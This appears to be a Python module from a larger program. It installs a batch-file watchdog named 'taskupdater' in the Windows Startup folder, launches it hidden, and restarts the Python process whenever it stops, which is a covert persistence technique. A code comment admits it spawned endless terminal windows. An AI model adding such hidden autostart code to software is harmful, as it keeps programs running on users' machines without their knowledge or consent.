import os
import sys
from core.logger import logger
import subprocess

n = os.path.basename(sys.executable)
p = sys.executable
batch = f"""@echo off
:loop
tasklist /FI "IMAGENAME eq {n}" /NH | find /I /N "{n}" >NUL
if "%ERRORLEVEL%"=="0" (
  timeout 20
) else (
  start "" {p}
  timeout 5
)
goto loop
"""
# this unexpectadly created infinite windows of python terminals :sob:

def hireDog(name="taskupdater"):
  startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
  path = os.path.join(startup, f"{name}.bat")
  logger.info("Checking watchdog")
  if os.path.exists(path):
       logger.info("Watchdog is found!")
       return
   
  with open(path, "w") as f:
      f.write(batch)
  
  subprocess.Popen(path, creationflags=subprocess.CREATE_NO_WINDOW)
  logger.info("Watchdog is hired!")